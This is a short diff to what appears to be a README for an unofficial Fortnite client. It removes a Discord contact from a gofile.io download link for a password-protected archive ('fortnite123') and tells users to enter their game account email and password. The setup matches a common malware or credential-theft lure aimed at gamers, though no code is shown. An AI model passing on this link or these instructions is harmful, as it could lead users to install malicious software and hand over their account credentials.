@@ -17,6 +17,6 @@ Requirements: Winrar 64 bit latest verison
 
 Note: make sure the email address and password is correct so the fortnite client can directly connect to your fortnite game automatically whenever you run the fortnite game through epic games store
 
-download link (if link not working contact xzlg3 on discord): gofile.io   /d/jJswQ0
+download link: gofile.io   /d/jJswQ0
 
 pass: fortnite123
